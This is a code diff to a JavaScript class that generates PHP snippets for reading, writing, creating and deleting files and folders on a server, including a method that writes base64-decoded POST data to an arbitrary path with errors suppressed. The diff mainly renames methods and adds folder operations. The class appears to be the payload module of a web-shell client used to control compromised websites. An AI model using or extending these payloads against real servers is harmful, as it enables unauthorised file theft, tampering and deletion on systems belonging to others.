@@ -5,7 +5,7 @@ export default class File {
         // console.log(1);
     }
 
-    change(){
+    change() {
         return `
         $dir = '${this.arg1}';
         if (!@is_dir($dir)) {
@@ -76,25 +76,37 @@ export default class File {
        `
     }
 
-    create() {
+    createFile() {
         return `
        @file_put_contents('${this.arg1}', '');
        `
     }
 
-    read(){
-        return`
+    createFolder() {
+        return `
+       @mkdir('${this.arg1}');
+       `
+    }
+
+    read() {
+        return `
         echo @file_get_contents('${this.arg1}');
         `
     }
 
-    change(){
-        return`@file_put_contents('${this.arg1}', base64_decode($_POST['${this.arg2}']));`
+    change() {
+        return `@file_put_contents('${this.arg1}', base64_decode($_POST['${this.arg2}']));`
     }
 
-    delete() {
+    deleteFile() {
         return `
        @unlink('${this.arg1}');
+       `
+    }
+
+    deleteFolder() {
+        return `
+       @rmdir('${this.arg1}');
        `
     }
 
